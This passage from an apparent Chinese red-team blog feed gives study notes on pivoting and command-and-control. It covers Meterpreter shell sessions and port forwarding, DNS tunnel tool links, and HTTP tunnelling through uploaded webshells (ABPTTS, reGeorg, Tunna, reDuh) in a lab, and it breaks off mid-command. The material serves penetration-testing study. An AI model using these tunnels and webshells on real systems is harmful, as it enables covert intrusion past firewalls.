class="hljs-number">.119</span>) Windows IP Configuration Ethernet adapter 本地连接:<span class="hljs-keyword">Connection</span>‐specific DNS Suffix . :IP Address. . . . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>Subnet <span class="hljs-keyword">Mask</span> . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">22</span><span class="hljs-number">123456789101112131415161718192021</span></code></pre><p><strong>靶机IP为：</strong><br>192.168.1.119—windows 2003—x64</p><p>需要转发端口为：80，3389</p><pre><code class="hljs dns">msf exploit(multi/handler) &gt; sessions ‐i <span class="hljs-number">1</span>[*] Starting interaction with <span class="hljs-number">1</span>... meterpreter &gt; shellProcess <span class="hljs-number">4012</span> created.Channel <span class="hljs-number">56</span> created.Microsoft Windows [版本 <span class="hljs-number">5.2.3790</span>](C) 版权所有 <span class="hljs-number">1985‐2003</span> Microsoft Corp.C:\Documents and Settings\Administrator\桌面&gt;if defined PSModulePath (echo ok!) else (echo sorry!)if defined PSModulePath (echo ok!) else (echo sorry!)sorry! C:\Documents and Settings\Administrator\桌面&gt;net config Workstationnet config Workstation计算机名 \\WIN03X64计算机全名 win03x64用户名 Administrator工作站正运行于NetbiosSmb (<span class="hljs-number">000000000000</span>)NetBT_Tcpip_&#123;<span class="hljs-number">37C12280</span>‐A19D‐<span class="hljs-number">4</span>D1A‐<span class="hljs-number">9365</span>‐<span class="hljs-number">6</span>CBF2CAE5B07&#125; (<span class="hljs-number">000</span>C2985D67D) 软件版本 Microsoft Windows Server <span class="hljs-number">2003</span>工作站域 WORKGROUP登录域 WIN03X64COM 打开超时 (秒) <span class="hljs-number">0</span>COM 发送计数 (字节) <span class="hljs-number">16</span>COM 发送超时 (毫秒) <span class="hljs-number">250</span>命令成功完成。C:\Documents and Settings\Administrator\桌面&gt;netstat ‐an|findstr &quot;LIST ENING&quot;netstat ‐an|findstr &quot;LISTENING&quot;TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">80 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">135 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">445 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1025 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1026 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3078 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3389 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9001 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">2995 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9000 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">139 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING</code></pre><pre><code class="hljs pf">meterpreter &gt; portfwd ‐hUsage: portfwd [‐h] [add | delete | list | <span class="hljs-keyword">flush</span>] [args] OPTIONS:‐L <span class="hljs-variable">&lt;opt&gt;</span> Forward: local host <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span> (optional). Reverse: local host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.‐R Indicates a reverse <span class="hljs-keyword">port</span> forward.‐h Help banner.‐i <span class="hljs-variable">&lt;opt&gt;</span> Index of the <span class="hljs-keyword">port</span> forward entry <span class="hljs-keyword">to</span> interact with (see the <span class="hljs-string">&quot;list&quot;</span> command).‐l <span class="hljs-variable">&lt;opt&gt;</span> Forward: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. Reverse: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.‐p <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>. Reverse: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.‐r <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.<span class="hljs-number">1234567891011</span></code></pre><p><strong>攻击机执行：</strong></p><pre><code class="hljs dns">meterpreter &gt; portfwd add ‐l <span class="hljs-number">33389</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">3389</span>[*] Local TCP relay created: :<span class="hljs-number">33389</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">3389</span>meterpreter &gt; portfwd add ‐l <span class="hljs-number">30080</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">80</span>[*] Local TCP relay created: :<span class="hljs-number">30080</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">80</span>meterpreter &gt; portfwd Active Port Forwards==================== Index Local Remote Direction‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐<span class="hljs-number">1 0.0.0</span>.<span class="hljs-number">0:33389 192</span>.<span class="hljs-number">168.1.119</span>:<span class="hljs-number">3389</span> Forward<span class="hljs-number">2 0.0.0</span>.<span class="hljs-number">0:30080 192</span>.<span class="hljs-number">168.1.119:80</span> Forward <span class="hljs-number">2</span> total active port forwards.</code></pre><p>查看攻击机LISTEN端口：转发已成功</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# netstat ‐ntlp |grep :<span class="hljs-number">3</span><span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:33389</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby<span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:30080</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby <span class="hljs-number">4</span></code></pre><p>Windows 7 分别访问攻击机33389，30080，既等价访问靶机3389，80</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">95</span>-ji-yu-portfwd-duan-kou-zhuan-fa</code></pre><hr><h2 id="3、Venom-代理转发、多级穿透"><a href="#3、Venom-代理转发、多级穿透" class="headerlink" title="3、Venom-代理转发、多级穿透"></a>3、Venom-代理转发、多级穿透</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ms509.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">06</span><span class="hljs-regexp">/17/</span>Intranet-penetration/   --非常详细全面的内网穿透技术总结https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011215939/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">103403545</span>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4058</span>   --Venom 渗透测试人员的多级代理http:<span class="hljs-regexp">//</span>www.vkxss.top<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/30/</span>内网渗透-Venom内网工具使用实战/</code></pre><hr><h2 id="4、DNS隧道"><a href="#4、DNS隧道" class="headerlink" title="4、DNS隧道"></a>4、DNS隧道</h2><h3 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.dengxj.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">14</span>/https:<span class="hljs-regexp">//m</span>ntn0x.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">03</span><span class="hljs-regexp">/24/</span>DNS隧道搭建/https:<span class="hljs-regexp">//</span>blog.werner.wiki<span class="hljs-regexp">/building-a-dns-tunnel-with-dns2tcp/</span>   --使用dns2tcp搭建DNS隧道(老文章思路）</code></pre><p>书里的思路也很好…</p><hr><h3 id="dns隧道之dnscat2"><a href="#dns隧道之dnscat2" class="headerlink" title="dns隧道之dnscat2"></a>dns隧道之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PY0A   --DNScat2工具:通过DNS进行C&amp;C通信https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_41598660/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106658548</span>   --最新复现文章</code></pre><h3 id="dns隧道之Iodine"><a href="#dns隧道之Iodine" class="headerlink" title="dns隧道之Iodine"></a>dns隧道之Iodine</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">70263701</span>https:<span class="hljs-regexp">//</span>juejin.im<span class="hljs-regexp">/post/</span><span class="hljs-number">6844903767461068807</span></code></pre><p>书上介绍了MSF配合lodine使用方法…</p><h3 id="使用dns协议上线msf之dnscat2"><a href="#使用dns协议上线msf之dnscat2" class="headerlink" title="使用dns协议上线msf之dnscat2"></a>使用dns协议上线msf之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1672113</span></code></pre><p>书上介绍了MSF配合dnscat2使用方法…</p><h3 id="使用dns协议上线msf之dns2tcp"><a href="#使用dns协议上线msf之dns2tcp" class="headerlink" title="使用dns协议上线msf之dns2tcp"></a>使用dns协议上线msf之dns2tcp</h3><p>这里只能看书了，这里树上很精彩，后期我会复现…</p><p>总结：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7701</span>      --第四章总结工具文章http:<span class="hljs-regexp">//</span>www.feidao.site<span class="hljs-regexp">/wordpress/i</span>ndex.php<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/11/yi</span>ngyong/<span class="hljs-comment">#toc-head-13  --好好看完</span>https:<span class="hljs-regexp">//</span><span class="hljs-number">2017</span>.zeronights.org<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/materials/</span>ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;四、穿透与转发&quot;&gt;&lt;a href=&quot;#四、穿透与转发&quot; class=&quot;headerlink&quot; title=&quot;四、穿透与转发&quot;&gt;&lt;/a&gt;四、穿透与转发&lt;/h1&gt;&lt;h2 id=&quot;1、Frp内网穿透实战&quot;&gt;&lt;a href=&quot;#1、Frp内网穿透实战&quot; class=&quot;he</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之命令与控制</title>
    <link href="http://www.secice.cn/p/b25a2f1c"/>
    <id>http://www.secice.cn/p/b25a2f1c</id>
    <published>2020-12-21T06:19:25.000Z</published>
    <updated>2020-12-21T08:52:21.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="三、命令与控制"><a href="#三、命令与控制" class="headerlink" title="三、命令与控制"></a>三、命令与控制</h1><h2 id="1、HTTP-隧道-ABPTTS"><a href="#1、HTTP-隧道-ABPTTS" class="headerlink" title="1、HTTP 隧道 ABPTTS"></a>1、HTTP 隧道 ABPTTS</h2><p><strong>ABPTTS简介：</strong></p><p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP/HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。</p><p><strong>2016年blackhat介绍：</strong></p><ul><li><a href="https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun">https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></li></ul><p><strong>安装与生成payload：</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/nccgroup/ABPTTS.git</span>Cloning into <span class="hljs-string">&#x27;ABPTTS&#x27;</span>...remote: Enumerating objects: 50, <span class="hljs-keyword">done</span>.remote: Total 50 (delta 0), reused 0 (delta 0), pack‐reused 50Unpacking objects: 100% (50/50), <span class="hljs-keyword">done</span>.root@John:~<span class="hljs-comment"># pip install pycrypto</span>Requirement already satisfied: pycrypto <span class="hljs-keyword">in</span> /usr/lib/python2.7/dist‐packages (2.6.1)root@John:~<span class="hljs-comment"># cd ABPTTS/</span>root@John:~/ABPTTS<span class="hljs-comment"># ls</span>abpttsclient.py abpttsfactory.py ABPTTS‐Manual.pdf data libabptts.py license.txt README.md settings_overlays templateroot@John:~/ABPTTS<span class="hljs-comment"># python abpttsfactory.py ‐o webshell</span>[2019‐01‐28 08:24:28.131919] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐[2019‐01‐28 08:24:28.131954] ‐‐==[[ ‐ Factory ‐ ]]==‐‐[2019‐01‐28 08:24:28.131965] Ben Lincoln, NCC Group[2019‐01‐28 08:24:28.131979] Version 1.0 ‐ 2016‐07‐30[2019‐01‐28 08:24:28.132706] Output files will be created <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/root/ABPTTS/webshell&quot;</span>[2019‐01‐28 08:24:28.132722] Client‐side configuration file will be written as <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>[2019‐01‐28 08:24:28.132739] Using <span class="hljs-string">&quot;/root/ABPTTS/data/american‐english ‐lowercase‐4‐64.txt&quot;</span> as a wordlist file[2019‐01‐28 08:24:28.136713] Created client configuration file <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>[2019‐01‐28 08:24:28.137760] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.jsp&quot;</span>[2019‐01‐28 08:24:28.138342] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.aspx&quot;</span>[2019‐01‐28 08:24:28.138492] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/WEB‐INF/web.xml&quot;</span>[2019‐01‐28 08:24:28.138555] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/META‐INF/MANIFEST.MF&quot;</span>[2019‐01‐28 08:24:28.139128] Prebuilt JSP WAR file: /root/ABPTTS/webshell/scabGroup.war[2019‐01‐28 08:24:28.139140] Unpacked WAR file contents:/root/ABPTTS/webshell/war</code></pre><p>安装<code>pycrypto</code>出现问题参考：</p><ul><li><a href="https://blog.csdn.net/l1028386804/article/details/87006754">https://blog.csdn.net/l1028386804/article/details/87006754</a></li></ul><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/01.png" alt="demo"><br><strong>攻击机执行：</strong></p><p>注：如果攻击机为vps，则 -f 需要填写vps_ip:port/目标机:port</p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">abpttsclient</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-selector-tag">webshell</span>/<span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">-u</span> &quot;<span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">abptts</span><span class="hljs-selector-class">.aspx</span>&quot; <span class="hljs-selector-tag">-f</span> 192.168.1.101<span class="hljs-selector-pseudo">:33389</span>/192.168.126.170<span class="hljs-selector-pseudo">:3389</span></code></pre><p>然后连接<code>192.168.1.101:33389</code>即可，挺卡的。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/02.png" alt="连接3389"></p><p><code>提示目前不支持PHP</code></p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji</a></li></ul><hr><h2 id="2、HTTP-隧道-reGeorg"><a href="#2、HTTP-隧道-reGeorg" class="headerlink" title="2、HTTP 隧道 reGeorg"></a>2、HTTP 隧道 reGeorg</h2><p>reGeorg 的前身是2008年 SensePost 在 BlackHat USA 2008 的 reDuh 延伸与扩展。也是目前安全从业人员使用最多，范围最广，支持多丰富的一款 http 隧道。从本质上讲，可以将 JSP/PHP/ASP/ASPX 等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>2014年blackhat介绍</strong></p><ul><li><a href="https://www.blackhat.com/eu-14/arsenal.html#regeorg">https://www.blackhat.com/eu-14/arsenal.html#regeorg</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li></ul><p><strong>环境</strong></p><pre><code class="hljs accesslog">靶机：<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/sensepost/reGeorg.git</span>Cloning into <span class="hljs-string">&#x27;reGeorg&#x27;</span>...remote: Enumerating objects: 85, <span class="hljs-keyword">done</span>.remote: Total 85 (delta 0), reused 0 (delta 0), pack‐reused 85Unpacking objects: 100% (85/85), <span class="hljs-keyword">done</span>.root@John:~<span class="hljs-comment"># cd reGeorg/</span>root@John:~reGeorg<span class="hljs-comment"># ls</span>LICENSE.html LICENSE.txt README.md reGeorgSocksProxy.py tunnel.ashx tunnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsproot@John:~/reGeorg<span class="hljs-comment"># python reGeorgSocksProxy.py ‐h</span>__________ ______ __|___ |__ ______ _____ _____ ______| | | ___|| ___| || ___|/ \| | | ___|| \ | ___|| | | || ___|| || \ | | ||__|\__\|______||______| __||______|\_____/|__|\__\|______||_____|... every office needs a tool like Georg willem@sensepost.com / @_w_m__sam@sensepost.com / @trowaltsetienne@sensepost.com / @kamp_staaldraad usage: reGeorgSocksProxy.py [‐h] [‐l] [‐p] [‐r] ‐u [‐v] Socks server <span class="hljs-keyword">for</span> reGeorg HTTP(s) tunneller optional arguments:‐h, ‐‐<span class="hljs-built_in">help</span> show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>‐l , ‐‐listen‐on The default listening address‐p , ‐‐listen‐port The default listening port‐r , ‐‐<span class="hljs-built_in">read</span>‐buff Local <span class="hljs-built_in">read</span> buffer, max data to be sent per POST‐u , ‐‐url The url containing the tunnel script‐v , ‐‐verbose Verbose output[INFO\|DEBUG]</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/03.png" alt="demo"></p><p><strong>攻击机执行：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">reGeorgSocksProxy</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-p</span> 8080 <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">tunnel</span><span class="hljs-selector-class">.aspx</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/04.png" alt="运行"><br><strong>Windows下配合Proxifier：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/05.png" alt="Proxifier"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/06.png" alt="使用内网IP连接服务器"><br>目前大部分waf都会针对默认原装版本的reGeorg</p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji</a></li></ul><hr><h2 id="3、HTTP-隧道-Tunna"><a href="#3、HTTP-隧道-Tunna" class="headerlink" title="3、HTTP 隧道 Tunna"></a>3、HTTP 隧道 Tunna</h2><p><strong>Tunna简介：</strong></p><p>Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。</p><p><strong>Tunna演示稿：</strong></p><ul><li><a href="https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE">https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机<span class="hljs-number">192.168.1.101</span>靶机<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# git clone https://github.com/SECFORCE/Tunna.git<span class="hljs-attribute">Cloning</span> into &#x27;Tunna&#x27;...<span class="hljs-attribute">remote</span>: Enumerating objects: <span class="hljs-number">6</span>, done.<span class="hljs-attribute">remote</span>: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.<span class="hljs-attribute">remote</span>: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.<span class="hljs-attribute">remote</span>: Total <span class="hljs-number">156</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">2</span> (delta <span class="hljs-number">0</span>), pack‐reused <span class="hljs-number">150</span><span class="hljs-attribute">Receiving</span> objects: <span class="hljs-number">100</span>% (<span class="hljs-number">156</span>/<span class="hljs-number">156</span>), <span class="hljs-number">8</span>.<span class="hljs-number">93</span> MiB | <span class="hljs-number">25</span>.<span class="hljs-number">00</span> KiB/s, done.<span class="hljs-attribute">Resolving</span> deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">84</span>/<span class="hljs-number">84</span>), done.</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/07.png" alt="demo"><br><strong>攻击机执行：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/08.png" alt="执行"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/09.png" alt="连接"><br><strong>附录：</strong><br>解决：<code>General Exception: [Errno 104] Connection reset by peer</code></p><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> Spawning keep‐alive thread<span class="hljs-string">[‐]</span> Keep‐alive thread <span class="hljs-keyword">not</span> required<span class="hljs-string">[+]</span> Checking <span class="hljs-keyword">for</span> proxy: False</code></pre><p>连接后，出现</p><pre><code class="hljs pgsql">General <span class="hljs-keyword">Exception</span>: [Errno <span class="hljs-number">104</span>] <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">reset</span> <span class="hljs-keyword">by</span> peer</code></pre><p>等待出现：无法验证此远程计算机的身份，是否仍要连接？</p><p>再次运行，在点击是(Y)</p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/10.png" alt="解决报错"></p><p>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p><p>注册表键值：<code> HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code> 删除对应IP键值即可。</p><p>Tunna对PHP的支持并不是太友好</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">99</span>http-sui-dao-tunna-di-san-ji</code></pre><hr><h2 id="4、HTTP-隧道-reDun"><a href="#4、HTTP-隧道-reDun" class="headerlink" title="4、HTTP 隧道 reDun"></a>4、HTTP 隧道 reDun</h2><p><strong>reDuh简介：</strong></p><p>reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>BlackHat USA 2008介绍：</strong></p><ul><li><a href="https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-">https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-</a></li></ul><p><strong>reDuh使用条件</strong></p><p>（1）获取目标服务器webshell，且可以上传reDuh服务端对应脚本文件。</p><p>（2）知道目标服务器开放的内网端口，如远程桌面的端口是3389。</p><p>（3）目标服务器网络做了端口策略限制，只允许外部访问内网的80等特定端口。</p><p><strong>Github：</strong></p><ul><li><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机<span class="hljs-number">192.168.1.101</span>靶机<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs elixir">root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># git clone 